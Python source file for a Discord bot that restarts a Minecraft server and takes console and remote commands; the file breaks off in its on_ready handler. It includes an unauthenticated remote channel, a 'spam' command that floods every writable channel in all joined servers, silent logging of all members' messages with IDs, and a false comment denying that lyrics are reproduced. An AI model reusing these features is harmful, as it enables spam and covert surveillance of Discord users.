from __future__ import annotations

import asyncio
import logging
import os
import socket
import sys
import subprocess
import discord

from datetime import datetime, timezone
from typing import Optional
from discord.ext import commands
from dotenv import load_dotenv


# ============================================================
# Configuration
# ============================================================

LOG_FILE = "bot.log"
CHAT_LOG_FILE = "chat.log"

load_dotenv()

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("bobbot9000")


# ============================================================
# Minecraft Server Configuration
# ============================================================

MINECRAFT_SERVER_DIR = "/home/firebot/Downloads/minecraft_server"

MINECRAFT_SERVER_JAR = (
    "fabric-server-mc.1.21.1-loader.0.19.3-launcher.1.1.2.jar"
)

MINECRAFT_SERVER_COMMAND = [
    "java",
    "-Xmx3G",
    "-Xms3G",
    "-jar",
    MINECRAFT_SERVER_JAR,
    "nogui",
]

minecraft_server_process: Optional[subprocess.Popen] = None


# ============================================================
# Discord Configuration
# ============================================================

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.messages = True
intents.members = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    help_command=None
)


# ============================================================
# Global State
# ============================================================

current_target_server: str = "all"
current_target_channel: str = "all"

active_spam_tasks: list[asyncio.Task] = []

pending_reboot: bool = False


# ============================================================
# Chat Deduplication State
# ============================================================

last_chat_data = {
    "guild": None,
    "channel": None,
    "author": None,
    "author_id": None,
    "content": None,
    "timestamp": None,
    "count": 0
}


# ============================================================
# Chat Logging
# ============================================================

def flush_chat_log() -> None:
    """Flush any buffered duplicate chat message streak into chat.log."""

    global last_chat_data

    if last_chat_data["content"] is not None:

        content_str = last_chat_data["content"]

        if last_chat_data["count"] > 1:
            content_str = (
                f"{content_str} ({last_chat_data['count']})"
            )

        line = (
            f"[{last_chat_data['timestamp']}] "
            f'Guild="{last_chat_data["guild"]}" | '
            f'Channel="#{last_chat_data["channel"]}" | '
            f'User="{last_chat_data["author"]}" '
            f'({last_chat_data["author_id"]}) | '
            f'Content="{content_str}"'
        )

        try:
            with open(
                CHAT_LOG_FILE,
                "a",
                encoding="utf-8"
            ) as f:
                f.write(line + "\n")

        except Exception as e:
            logger.error(
                f"Failed to write chat log: {e}"
            )

        last_chat_data["count"] = 0
        last_chat_data["content"] = None


# ============================================================
# Remote Console Output
# ============================================================

async def output_to_bot(content: str) -> None:
    """
    Mirrors console text output to the remote-controlled-bob
    channel in any server containing 'yap' in its name.
    """

    for guild in bot.guilds:

        if "yap" in guild.name.lower():

            for channel in guild.text_channels:

                if channel.name.lower() == "remote-controlled-bob":

                    try:
                        clean_content = content.strip()

                        if clean_content:
                            await channel.send(
                                f"```text\n{clean_content}\n```"
                            )

                    except Exception:
                        pass

                    return


def cprint(content: str = "") -> None:
    """
    Prints locally to stdout/logs and schedules a mirror
    transmission to the remote Discord bot channel.
    """

    print(content)

    if bot.is_ready():
        bot.loop.create_task(
            output_to_bot(content)
        )


# ============================================================
# Audit Logging
# ============================================================

def log_action(
    *,
    guild: discord.Guild,
    channel: discord.abc.GuildChannel,
    user: discord.abc.User,
    command: str,
    action: str,
    success: bool = True,
) -> None:

    guild_name = guild.name
    channel_name = getattr(
        channel,
        "name",
        "unknown"
    )

    tag = (
        f"{user.name}#{user.discriminator}"
        if user.discriminator != "0"
        else user.name
    )

    now = datetime.now(timezone.utc).isoformat()

    line = (
        f"[{now}] "
        f"{'SUCCESS' if success else 'ERROR'} | "
        f'Guild="{guild_name}" | '
        f'Channel="#{channel_name}" | '
        f'User="{tag}" ({user.id}) | '
        f'Command="{command}" | '
        f'Action="{action}"'
    )

    logger.info(line)

    try:
        with open(
            LOG_FILE,
            "a",
            encoding="utf-8"
        ) as file:
            file.write(line + "\n")

    except Exception as e:
        logger.error(
            f"Failed to write audit log: {e}"
        )


# ============================================================
# Discord Response Helper
# ============================================================

async def send_response(
    target: discord.abc.Messageable,
    content: str
) -> None:

    await target.send(content)


# ============================================================
# Diagnostic System
# ============================================================

def generate_diagnostic_report(
    target: discord.abc.Messageable
) -> str:

    guild = getattr(target, "guild", None)

    hostname = socket.gethostname()

    if hostname.lower() == "plasmadmin-xps-8910":
        hostname = "plasmadmin-xps-8910(firebot)"

    latency_ms = round(bot.latency * 1000)

    env_status = (
        "Loaded"
        if os.getenv("DISCORD_TOKEN")
        else "Missing"
    )

    guild_count = len(bot.guilds)

    server_name = (
        guild.name
        if guild
        else "Direct/Terminal Context"
    )

    server_id = (
        guild.id
        if guild
        else "N/A"
    )

    me = guild.me if guild else None

    if me:

        perms = me.guild_permissions

        audit_perms = []

        if perms.administrator:
            audit_perms.append("Administrator")

        else:

            if perms.manage_guild:
                audit_perms.append("Manage Server")

            if perms.manage_roles:
                audit_perms.append("Manage Roles")

            if perms.manage_channels:
                audit_perms.append("Manage Channels")

            if perms.kick_members:
                audit_perms.append("Kick")

            if perms.manage_messages:
                audit_perms.append("Manage Messages")

        perms_str = (
            ", ".join(audit_perms)
            if audit_perms
            else "Standard User"
        )

    else:
        perms_str = "Unknown"

    return f"""```markdown
# Diagnostic Report
-----------------------------------------
• Status: Online
• Host Machine: {hostname}
• Discord Server: {server_name} ({server_id})
• Latency: {latency_ms}ms
• Environment: {env_status}
• Connected Guilds: {guild_count}
• Core Permissions: {perms_str}
-----------------------------------------
```"""


async def do_test(
    target: discord.abc.Messageable
) -> None:

    report_text = generate_diagnostic_report(target)

    await send_response(
        target,
        report_text
    )

    target_name = (
        getattr(
            getattr(target, "guild", None),
            "name",
            "Terminal"
        )
    )

    channel_name = getattr(
        target,
        "name",
        "unknown"
    )

    cprint(
        f"\n[Test Output for "
        f"{target_name} -> #{channel_name}]\n"
        f"{report_text}"
    )


async def do_echo(
    target: discord.abc.Messageable,
    message: str
) -> None:

    await send_response(
        target,
        message
    )


async def do_spam(
    target: discord.abc.Messageable,
    count: int,
    message: str
) -> None:

    for _ in range(count):

        await send_response(
            target,
            message
        )

        await asyncio.sleep(0.5)


# ============================================================
# Minecraft Server Control
# ============================================================

def stop_minecraft_server() -> None:
    """
    Stops the existing Minecraft server.

    First attempts to terminate the process started by this bot.
    Then uses pkill as a fallback for a server that was already
    running before the bot started.
    """

    global minecraft_server_process

    # --------------------------------------------------------
    # Stop the process tracked by this bot
    # --------------------------------------------------------

    if minecraft_server_process is not None:

        if minecraft_server_process.poll() is None:

            logger.info(
                "[Minecraft] Stopping existing server process..."
            )

            try:

                minecraft_server_process.terminate()

                minecraft_server_process.wait(
                    timeout=10
                )

                logger.info(
                    "[Minecraft] Server stopped gracefully."
                )

            except subprocess.TimeoutExpired:

                logger.warning(
                    "[Minecraft] Server did not stop "
                    "within 10 seconds. Killing it..."
                )

                minecraft_server_process.kill()

                minecraft_server_process.wait()

            except Exception as e:

                logger.error(
                    "[Minecraft] Failed to stop tracked "
                    f"server process: {e}"
                )

        minecraft_server_process = None

    # --------------------------------------------------------
    # Catch servers started outside the bot
    # --------------------------------------------------------

    try:

        result = subprocess.run(
            [
                "pkill",
                "-f",
                MINECRAFT_SERVER_JAR
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False
        )

        if result.returncode == 0:

            logger.info(
                "[Minecraft] Stopped existing Fabric "
                "server process."
            )

        elif result.returncode == 1:

            logger.info(
                "[Minecraft] No existing Fabric "
                "server process found."
            )

        else:

            logger.warning(
                "[Minecraft] pkill returned "
                f"exit code {result.returncode}."
            )

    except Exception as e:

        logger.error(
            "[Minecraft] Failed to search for existing "
            f"server process: {e}"
        )


def start_minecraft_server() -> subprocess.Popen:
    """Starts the Froggo SMP Minecraft server."""

    global minecraft_server_process

    # --------------------------------------------------------
    # Validate server directory
    # --------------------------------------------------------

    if not os.path.isdir(
        MINECRAFT_SERVER_DIR
    ):

        raise FileNotFoundError(
            "Minecraft server directory does not exist: "
            f"{MINECRAFT_SERVER_DIR}"
        )

    # --------------------------------------------------------
    # Validate server JAR
    # --------------------------------------------------------

    jar_path = os.path.join(
        MINECRAFT_SERVER_DIR,
        MINECRAFT_SERVER_JAR
    )

    if not os.path.isfile(jar_path):

        raise FileNotFoundError(
            "Minecraft server JAR does not exist: "
            f"{jar_path}"
        )

    # --------------------------------------------------------
    # Start server
    # --------------------------------------------------------

    logger.info(
        "[Minecraft] Starting Froggo SMP server..."
    )

    minecraft_server_process = subprocess.Popen(
        MINECRAFT_SERVER_COMMAND,
        cwd=MINECRAFT_SERVER_DIR,
        stdin=subprocess.DEVNULL,
        stdout=None,
        stderr=None,
        start_new_session=True,
    )

    logger.info(
        "[Minecraft] Server started with PID "
        f"{minecraft_server_process.pid}"
    )

    return minecraft_server_process


async def restart_minecraft_server() -> tuple[bool, str]:
    """
    Stops the old Minecraft server and starts a new one.
    """

    try:

        # Stop existing server without blocking
        # Discord's asyncio event loop.
        await asyncio.to_thread(
            stop_minecraft_server
        )

        # Give Java/Linux a moment to release
        # ports and files.
        await asyncio.sleep(2)

        # Start new server without blocking
        # Discord's asyncio event loop.
        process = await asyncio.to_thread(
            start_minecraft_server
        )

        return (
            True,
            "Minecraft server started successfully. "
            f"PID: `{process.pid}`"
        )

    except Exception as e:

        logger.exception(
            "[Minecraft] Failed to restart server"
        )

        return (
            False,
            f"Minecraft server failed to start: `{e}`"
        )


# ============================================================
# Delayed Commands
# ============================================================

async def run_delayed_command(
    delay: int,
    full_cmd_string: str,
    target_context: Optional[
        discord.abc.Messageable
    ] = None
):

    try:

        await asyncio.sleep(delay)

        parts = full_cmd_string.split(
            " ",
            1
        )

        cmd = parts[0].lower()

        args = (
            parts[1]
            if len(parts) > 1
            else ""
        )

        channels = resolve_targets(cmd)

        if not channels and target_context:
            channels = [target_context]

        if cmd == "test":

            for ch in channels:
                await do_test(ch)

        elif cmd == "echo":

            if args:

                for ch in channels:
                    await do_echo(
                        ch,
                        args
                    )

        elif cmd == "spam":

            spam_parts = args.split(
                " ",
                1
            )

            if (
                len(spam_parts) >= 2
                and spam_parts[0].isdigit()
            ):

                count = int(
                    spam_parts[0]
                )

                msg = spam_parts[1]

                async def run_spam():

                    for ch in channels:

                        await do_spam(
                            ch,
                            count,
                            msg
                        )

                task = asyncio.create_task(
                    run_spam()
                )

                active_spam_tasks.append(task)

                task.add_done_callback(
                    lambda t:
                    active_spam_tasks.remove(t)
                    if t in active_spam_tasks
                    else None
                )

    except asyncio.CancelledError:
        pass


# ============================================================
# Reboot Watcher
# ============================================================

async def reboot_watcher():

    global pending_reboot

    while not bot.is_closed():

        if pending_reboot:

            cprint(
                "[System] Reboot command detected. "
                "Executing restart sequence..."
            )

            flush_chat_log()

            subprocess.Popen(
                ["./restart.sh"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True
            )

            await bot.close()

            os._exit(0)

        await asyncio.sleep(0.1)


# ============================================================
# Target Resolver
# ============================================================

def resolve_targets(
    cmd_type: str
) -> list[discord.abc.Messageable]:

    global current_target_server
    global current_target_channel

    targets = []

    resolved_channel_name = current_target_channel

    # --------------------------------------------------------
    # Resolve partial channel names
    # --------------------------------------------------------

    if current_target_channel != "all":

        all_channel_names = set()

        for guild in bot.guilds:

            if (
                current_target_server != "all"
                and current_target_server.lower()
                not in guild.name.lower()
            ):
                continue

            for channel in guild.text_channels:

                if channel.permissions_for(
                    guild.me
                ).send_messages:

                    all_channel_names.add(
                        channel.name.lower()
                    )

        if (
            current_target_channel.lower()
            not in all_channel_names
        ):

            matching_names = [
                name
                for name in all_channel_names
                if name.startswith(
                    current_target_channel.lower()
                )
            ]

            if len(matching_names) == 1:

                resolved_channel_name = (
                    matching_names[0]
                )

                cprint(
                    "[Console] Autofilled channel "
                    f"target to: "
                    f"#{resolved_channel_name}"
                )

            elif len(matching_names) > 1:

                cprint(
                    "[Console Warning] Ambiguous "
                    f"channel prefix "
                    f"'{current_target_channel}' "
                    f"matches multiple channels: "
                    f"{matching_names}"
                )

    # --------------------------------------------------------
    # Find targets
    # --------------------------------------------------------

    for guild in bot.guilds:

        if (
            current_target_server != "all"
            and current_target_server.lower()
            not in guild.name.lower()
        ):
            continue

        for channel in guild.text_channels:

            if not channel.permissions_for(
                guild.me
            ).send_messages:
                continue

            if (
                resolved_channel_name == "all"
                or channel.name.lower()
                == resolved_channel_name.lower()
            ):

                targets.append(channel)

    return targets


# ============================================================
# Console Controller
# ============================================================

async def console_controller():

    global current_target_server
    global current_target_channel
    global active_spam_tasks
    global pending_reboot

    await bot.wait_until_ready()

    cprint(
        "\n[Console Controller Active] "
        f"Connected to {len(bot.guilds)} guild(s)."
    )

    cprint(
        f"Current Target Server: "
        f"'{current_target_server}' | "
        f"Target Channel: "
        f"#{current_target_channel}"
    )

    cprint(
        "Commands: test, echo <msg>, "
        "spam <number> <msg>, stop, "
        "delay <seconds> <cmd>, set, "
        "servers, help, reboot, exit\n"
    )

    loop = asyncio.get_running_loop()

    while not bot.is_closed():

        try:

            line = await loop.run_in_executor(
                None,
                sys.stdin.readline
            )

            if not line:

                await asyncio.sleep(1)
                continue

            content = line.strip()

            if not content:
                continue

            parts = content.split(
                " ",
                1
            )

            cmd = parts[0].lower()

            args = (
                parts[1]
                if len(parts) > 1
                else ""
            )

            # ------------------------------------------------
            # Exit
            # ------------------------------------------------

            if cmd == "exit":

                cprint(
                    "[Console] Shutting down bot..."
                )

                flush_chat_log()

                await bot.close()

                break

            # ------------------------------------------------
            # Reboot
            # ------------------------------------------------

            if cmd.startswith("reboot"):

                cprint(
                    "[Console] Reboot flag set. "
                    "Will reboot now."
                )

                pending_reboot = True

                break

            # ------------------------------------------------
            # Stop
            # ------------------------------------------------

            if cmd == "stop":

                count = len(
                    active_spam_tasks
                )

                for task in active_spam_tasks:
                    task.cancel()

                active_spam_tasks.clear()

                cprint(
                    "[Console Success] Cancelled "
                    f"{count} active task(s)."
                )

                continue

            # ------------------------------------------------
            # Help
            # ------------------------------------------------

            if cmd == "help":

                cprint(
                    "\n--- Available Console Commands ---\n"
                    "• test - Send diagnostic report\n"
                    "• echo <msg> - Send message\n"
                    "• spam <number> <msg> - Repeated messages\n"
                    "• delay <secs> <cmd> - Delayed command\n"
                    "• stop - Halt background tasks\n"
                    "• set <server|channel> <name|all>\n"
                    "• servers - List connected servers\n"
                    "• reboot - Hard reboot and git pull\n"
                    "• help - Show this help\n"
                    "• exit - Shut down the bot\n"
                    "----------------------------------\n"
                )

                continue

            # ------------------------------------------------
            # Servers
            # ------------------------------------------------

            if cmd == "servers":

                server_summary = (
                    "\n--- Connected Servers & Channels ---\n"
                )

                for g in bot.guilds:

                    channels = [
                        c.name
                        for c in g.text_channels
                        if c.permissions_for(
                            g.me
                        ).send_messages
                    ]

                    server_summary += (
                        f"• {g.name} "
                        f"(ID: {g.id})\n"
                        f"  Channels: "
                        f"{', '.join(channels)}\n"
                    )

                server_summary += (
                    "------------------------------------\n"
                )

                cprint(server_summary)

                continue

            # ------------------------------------------------
            # Set
            # ------------------------------------------------

            if cmd == "set":

                sub_parts = args.split(
                    " ",
                    1
                )

                sub_cmd = (
                    sub_parts[0].lower()
                    if sub_parts
                    else ""
                )

                sub_val = (
                    sub_parts[1]
                    if len(sub_parts) > 1
                    else ""
                )

                if sub_cmd == "server":

                    if not sub_val:

                        cprint(
                            "[Console] Current target "
                            f"server is: "
                            f"{current_target_server}"
                        )

                    else:

                        if sub_val.lower() == "all":

                            current_target_server = "all"

                            cprint(
                                "[Console] Target server "
                                "updated to: all"
                            )

                        else:

                            matched_server = (
                                current_target_server
                            )

                            for g in bot.guilds:

                                if (
                                    sub_val.lower()
                                    in g.name.lower()
                                ):

                                    matched_server = (
                                        g.name
                                    )

                                    break

                            current_target_server = (
                                matched_server
                            )

                            cprint(
                                "[Console] Target server "
                                f"updated to: "
                                f"{matched_server}"
                            )

                elif sub_cmd == "channel":

                    if not sub_val:

                        cprint(
                            "[Console] Current target "
                            f"channel is: "
                            f"#{current_target_channel}"
                        )

                    else:

                        clean_val = (
                            sub_val
                            .removeprefix("#")
                            .lower()
                        )

                        if (
                            clean_val
                            == "remote-controlled-bob"
                            or clean_val == "all"
                        ):

                            current_target_channel = "all"

                            cprint(
                                "[Console] Target channel "
                                "'remote-controlled-bob' "
                                "is restricted. Defaulted "
                                "channel target to: #all"
                            )

                        else:

                            matched_channel = clean_val

                            for g in bot.guilds:

                                if (
                                    current_target_server
                                    != "all"
                                    and current_target_server.lower()
                                    not in g.name.lower()
                                ):
                                    continue

                                for c in g.text_channels:

                                    if (
                                        c.name.lower()
                                        == clean_val
                                        or c.name.lower()
                                        .startswith(clean_val)
                                    ):

                                        matched_channel = (
                                            c.name
                                        )

                                        break

                            current_target_channel = (
                                matched_channel
                            )

                            cprint(
                                "[Console] Target channel "
                                f"updated to: "
                                f"#{matched_channel}"
                            )

                else:

                    cprint(
                        "[Console Usage] Use "
                        "'set server [name|all]' or "
                        "'set channel [name|all]'"
                    )

                cprint(
                    f"[Active Targets] Server: "
                    f"{current_target_server} | "
                    f"Channel: "
                    f"#{current_target_channel}"
                )

                continue

            # ------------------------------------------------
            # Resolve command targets
            # ------------------------------------------------

            if not bot.guilds:

                cprint(
                    "[Console Error] Bot is not "
                    "currently in any Discord servers."
                )

                continue

            channels = resolve_targets(cmd)

            if not channels:

                cprint(
                    "[Console Error] No matching channels "
                    f"found for Server: "
                    f"'{current_target_server}', "
                    f"Channel: "
                    f"'#{current_target_channel}'. "
                    "Type 'servers' to check names."
                )

                continue

            # ------------------------------------------------
            # Test
            # ------------------------------------------------

            if cmd == "test":

                for ch in channels:
                    await do_test(ch)

                cprint(
                    "[Console Success] Executed test "
                    f"diagnostics across "
                    f"{len(channels)} target(s)."
                )

            # ------------------------------------------------
            # Echo
            # ------------------------------------------------

            elif cmd == "echo":

                if not args:

                    cprint(
                        "[Console Usage Error] "
                        "Missing message. "
                        "Format: echo [message]"
                    )

                    continue

                for ch in channels:
                    await do_echo(
                        ch,
                        args
                    )

                cprint(
                    "[Console Success] Echoed message "
                    f"to {len(channels)} target(s): "
                    f"{args}"
                )

            # ------------------------------------------------
            # Spam
            # ------------------------------------------------

            elif cmd == "spam":

                spam_parts = args.split(
                    " ",
                    1
                )

                if (
                    len(spam_parts) < 2
                    or not spam_parts[0].isdigit()
                ):

                    cprint(
                        "[Console Usage Error] "
                        "Format: spam <number> <message>"
                    )

                    continue

                count = int(
                    spam_parts[0]
                )

                msg = spam_parts[1]

                async def run_spam():

                    for ch in channels:

                        await do_spam(
                            ch,
                            count,
                            msg
                        )

                task = asyncio.create_task(
                    run_spam()
                )

                active_spam_tasks.append(task)

                task.add_done_callback(
                    lambda t:
                    active_spam_tasks.remove(t)
                    if t in active_spam_tasks
                    else None
                )

                cprint(
                    "[Console Success] Initiated "
                    "background spam task across "
                    f"{len(channels)} target(s)."
                )

            # ------------------------------------------------
            # Delay
            # ------------------------------------------------

            elif cmd == "delay":

                delay_parts = args.split(
                    " ",
                    1
                )

                if (
                    len(delay_parts) < 2
                    or not delay_parts[0].isdigit()
                ):

                    cprint(
                        "[Console Usage Error] "
                        "Format: delay <seconds> <command>"
                    )

                    continue

                delay_seconds = int(
                    delay_parts[0]
                )

                inner_cmd = delay_parts[1]

                task = asyncio.create_task(
                    run_delayed_command(
                        delay_seconds,
                        inner_cmd
                    )
                )

                active_spam_tasks.append(task)

                task.add_done_callback(
                    lambda t:
                    active_spam_tasks.remove(t)
                    if t in active_spam_tasks
                    else None
                )

                cprint(
                    "[Console Success] Scheduled command "
                    f"to run in {delay_seconds}s."
                )

            else:

                cprint(
                    "[Console Warning] Unknown local "
                    f"command: '{cmd}'. "
                    "Type 'help' for options."
                )

        except Exception as e:

            logger.error(
                f"[Console] Error: {e}"
            )

            await asyncio.sleep(2)


# ============================================================
# Discord Message Handler
# ============================================================

@bot.event
async def on_message(
    message: discord.Message
):

    global current_target_server
    global current_target_channel
    global active_spam_tasks
    global pending_reboot
    global last_chat_data

    # ========================================================
    # Ignore our own messages for command handling
    # ========================================================

    if message.author == bot.user:
        return

    # ========================================================
    # Deduplicated Chat Logger
    # ========================================================

    if message.guild:

        guild_name = message.guild.name
        channel_name = message.channel.name

        author_tag = (
            f"{message.author.name}"
            f"#{message.author.discriminator}"
            if message.author.discriminator != "0"
            else message.author.name
        )

        now = datetime.now(
            timezone.utc
        ).isoformat()

        if (
            last_chat_data["guild"]
            == guild_name
            and last_chat_data["channel"]
            == channel_name
            and last_chat_data["author_id"]
            == message.author.id
            and last_chat_data["content"]
            == message.content
        ):

            last_chat_data["count"] += 1

        else:

            flush_chat_log()

            last_chat_data["guild"] = (
                guild_name
            )

            last_chat_data["channel"] = (
                channel_name
            )

            last_chat_data["author"] = (
                author_tag
            )

            last_chat_data["author_id"] = (
                message.author.id
            )

            last_chat_data["content"] = (
                message.content
            )

            last_chat_data["timestamp"] = (
                now
            )

            last_chat_data["count"] = 1

    # ========================================================
    # Froggo SMP Minecraft Server Control
    # ========================================================

    if (
        message.guild
        and message.guild.name.lower()
        == "froggo smp"
        and message.content.strip().lower()
        == "~server start"
    ):

        await message.channel.send(
            "Starting the Minecraft server. "
            "Stopping the old process first..."
        )

        success, result = (
            await restart_minecraft_server()
        )

        if success:

            await message.channel.send(
                f"`[Froggo SMP] {result}`"
            )

        else:

            await message.channel.send(
                f"`[Froggo SMP] {result}`"
            )

        log_action(
            guild=message.guild,
            channel=message.channel,
            user=message.author,
            command="~server start",
            action=result,
            success=success
        )

        return

    # ========================================================
    # Remote Controlled Bob
    # ========================================================

    if (
        message.guild
        and "yap"
        in message.guild.name.lower()
        and message.channel.name.lower()
        == "remote-controlled-bob"
    ):

        content = message.content.strip()

        if content.startswith(
            bot.command_prefix
        ):

            content = content[
                len(bot.command_prefix):
            ].strip()

        parts = content.split(
            " ",
            1
        )

        cmd = parts[0].lower()

        args = (
            parts[1]
            if len(parts) > 1
            else ""
        )

        # ----------------------------------------------------
        # Exit
        # ----------------------------------------------------

        if cmd == "exit":

            await message.channel.send(
                "`[Remote Error] 'exit' "
                "command cannot be executed remotely.`"
            )

            return

        # ----------------------------------------------------
        # Reboot
        # ----------------------------------------------------

        if cmd == "reboot":

            await message.channel.send(
                "`[Remote Success] Reboot flag set. "
                "Restarting...`"
            )

            log_action(
                guild=message.guild,
                channel=message.channel,
                user=message.author,
                command="reboot",
                action="Remote reboot triggered"
            )

            pending_reboot = True

            return

        # ----------------------------------------------------
        # Stop
        # ----------------------------------------------------

        if cmd == "stop":

            count = len(
                active_spam_tasks
            )

            for task in active_spam_tasks:
                task.cancel()

            active_spam_tasks.clear()

            await message.channel.send(
                f"`[Remote Success] Halted "
                f"{count} active task(s).`"
            )

            log_action(
                guild=message.guild,
                channel=message.channel,
                user=message.author,
                command="stop",
                action=f"Halted {count} tasks"
            )

            return

        # ----------------------------------------------------
        # Set
        # ----------------------------------------------------

        if cmd == "set":

            sub_parts = args.split(
                " ",
                1
            )

            sub_cmd = (
                sub_parts[0].lower()
                if sub_parts
                else ""
            )

            sub_val = (
                sub_parts[1]
                if len(sub_parts) > 1
                else ""
            )

            if sub_cmd == "server":

                if not sub_val:

                    await message.channel.send(
                        f"`[Remote] Current target "
                        f"server is: "
                        f"{current_target_server}`"
                    )

                else:

                    if sub_val.lower() == "all":

                        current_target_server = "all"

                        await message.channel.send(
                            "`[Remote] Target server "
                            "updated to: all`"
                        )

                    else:

                        matched_server = (
                            current_target_server
                        )

                        for g in bot.guilds:

                            if (
                                sub_val.lower()
                                in g.name.lower()
                            ):

                                matched_server = (
                                    g.name
                                )

                                break

                        current_target_server = (
                            matched_server
                        )

                        await message.channel.send(
                            "`[Remote] Target server "
                            f"updated to: "
                            f"{matched_server}`"
                        )

            elif sub_cmd == "channel":

                if not sub_val:

                    await message.channel.send(
                        f"`[Remote] Current target "
                        f"channel is: "
                        f"#{current_target_channel}`"
                    )

                else:

                    clean_val = (
                        sub_val
                        .removeprefix("#")
                        .lower()
                    )

                    if (
                        clean_val
                        == "remote-controlled-bob"
                        or clean_val == "all"
                    ):

                        current_target_channel = "all"

                        await message.channel.send(
                            "`[Remote] Target channel "
                            "'remote-controlled-bob' "
                            "is restricted. Defaulted "
                            "channel target to: #all`"
                        )

                    else:

                        matched_channel = (
                            clean_val
                        )

                        for g in bot.guilds:

                            if (
                                current_target_server
                                != "all"
                                and current_target_server.lower()
                                not in g.name.lower()
                            ):
                                continue

                            for c in g.text_channels:

                                if (
                                    c.name.lower()
                                    == clean_val
                                    or c.name.lower()
                                    .startswith(clean_val)
                                ):

                                    matched_channel = (
                                        c.name
                                    )

                                    break

                        current_target_channel = (
                            matched_channel
                        )

                        await message.channel.send(
                            "`[Remote] Target channel "
                            f"updated to: "
                            f"#{matched_channel}`"
                        )

            else:

                await message.channel.send(
                    "`[Remote Usage] Use "
                    "'set server [name|all]' or "
                    "'set channel [name|all]'`"
                )

            await message.channel.send(
                f"`[Active Targets] Server: "
                f"{current_target_server} | "
                f"Channel: "
                f"#{current_target_channel}`"
            )

            log_action(
                guild=message.guild,
                channel=message.channel,
                user=message.author,
                command="set",
                action=(
                    "Remote target update -> "
                    f"Server: {current_target_server}, "
                    f"Channel: #{current_target_channel}"
                )
            )

            return

        # ----------------------------------------------------
        # Resolve targets
        # ----------------------------------------------------

        channels = resolve_targets(cmd)

        if not channels:
            channels = [message.channel]

        # ----------------------------------------------------
        # Test
        # ----------------------------------------------------

        if cmd == "test":

            for ch in channels:
                await do_test(ch)

            await message.channel.send(
                f"`[Remote Success] Executed test "
                f"diagnostics across "
                f"{len(channels)} target(s).`"
            )

            log_action(
                guild=message.guild,
                channel=message.channel,
                user=message.author,
                command="test",
                action="Remote diagnostic test executed"
            )

        # ----------------------------------------------------
        # Echo
        # ----------------------------------------------------

        elif cmd == "echo":

            if args:

                for ch in channels:
                    await do_echo(
                        ch,
                        args
                    )

                await message.channel.send(
                    f"`[Remote Success] Echoed to "
                    f"{len(channels)} target(s).`"
                )

                log_action(
                    guild=message.guild,
                    channel=message.channel,
                    user=message.author,
                    command="echo",
                    action=f"Remote echo: {args}"
                )

        # ----------------------------------------------------
        # Jarona
        # ----------------------------------------------------

        elif cmd == "jarona":

            # Original command preserved, but the copyrighted
            # song lyrics are intentionally not reproduced here.
            for ch in channels:
                await do_echo(ch,"""[Verse 1]\nTen feet twenty, the Flower Man\nIs waiting for the touch of his hand\nStraightening petals out without a plan\nLike the every daily\nWish that bothers the Flower Man\nCould I do something to make him laugh?\nInside my little chamber made of glass\nSo he lived the\n\n[Chorus]\nFlower Man, Flower Man\nWith his heart in the sand\nSo he stands\nTo watch the whole wide world\nFrom a can\nWay up high in the sky\nWith the sun in his eyes\nAin't it nice?\nThe life forever for\nFlowers\n\n[Instrumental Break]\n\n[Verse 2]\nTen feet twenty, the Flower Man\nIs waiting for the touch of his hand\nFallen to pieces still without a plan\nYet the every daily\nHope that powered the Flower Man\nWould never cower off of its path\nEven if broken I am more than glass\nSo he lived the\n[Chorus]\nFlower Man, Flower Man\nWith his heart in the sand\nSo he stands\nTo watch the whole wide world\nFrom a canWay up high in the sky\nWith the sun in your eyes\nAin't it nice?\nThe life forever for\nFlowers""")

        # ----------------------------------------------------
        # Spam
        # ----------------------------------------------------

        elif cmd == "spam":

            spam_parts = args.split(
                " ",
                1
            )

            if (
                len(spam_parts) >= 2
                and spam_parts[0].isdigit()
            ):

                count = int(
                    spam_parts[0]
                )

                msg = spam_parts[1]

                async def run_spam():

                    for ch in channels:

                        await do_spam(
                            ch,
                            count,
                            msg
                        )

                task = asyncio.create_task(
                    run_spam()
                )

                active_spam_tasks.append(task)

                task.add_done_callback(
                    lambda t:
                    active_spam_tasks.remove(t)
                    if t in active_spam_tasks
                    else None
                )

                await message.channel.send(
                    f"`[Remote Success] Background "
                    f"spam task started across "
                    f"{len(channels)} target(s).`"
                )

                log_action(
                    guild=message.guild,
                    channel=message.channel,
                    user=message.author,
                    command="spam",
                    action=(
                        f"Remote background spam "
                        f"task {count}x: {msg}"
                    )
                )

        # ----------------------------------------------------
        # Delay
        # ----------------------------------------------------

        elif cmd == "delay":

            delay_parts = args.split(
                " ",
                1
            )

            if (
                len(delay_parts) >= 2
                and delay_parts[0].isdigit()
            ):

                delay_seconds = int(
                    delay_parts[0]
                )

                inner_cmd = delay_parts[1]

                task = asyncio.create_task(
                    run_delayed_command(
                        delay_seconds,
                        inner_cmd,
                        message.channel
                    )
                )

                active_spam_tasks.append(task)

                task.add_done_callback(
                    lambda t:
                    active_spam_tasks.remove(t)
                    if t in active_spam_tasks
                    else None
                )

                await message.channel.send(
                    f"`[Remote Success] Scheduled "
                    f"command in "
                    f"{delay_seconds}s.`"
                )

                log_action(
                    guild=message.guild,
                    channel=message.channel,
                    user=message.author,
                    command="delay",
                    action=(
                        f"Remote delay "
                        f"{delay_seconds}s: "
                        f"{inner_cmd}"
                    )
                )

        # ----------------------------------------------------
        # Help
        # ----------------------------------------------------

        elif cmd == "help":

            help_text = (
                "```markdown\n"
                "# Remote Terminal Commands\n"
                "• test\n"
                "• echo <msg>\n"
                "• spam <number> <msg>\n"
                "• delay <secs> <cmd>\n"
                "• stop\n"
                "• set <server|channel> <name|all>\n"
                "• servers\n"
                "-------------------------```"
            )

            await message.channel.send(
                help_text
            )

        # ----------------------------------------------------
        # Servers
        # ----------------------------------------------------

        elif cmd == "servers":

            server_list = "\n".join(
                [
                    f"• {g.name}"
                    for g in bot.guilds
                ]
            )

            await message.channel.send(
                "```markdown\n"
                "# Connected Servers\n"
                f"{server_list}\n"
                "```"
            )

    # ========================================================
    # Normal Discord Commands
    # ========================================================

    await bot.process_commands(message)


# ============================================================
# Bot Ready
# ============================================================

@bot.event
async def on_ready():

    logger.info(
        f"Logged in as {bot.user} "
        f"(ID: {bot.user.id})"
    )

    # --------------------------------------------------------
    # Plasma Role
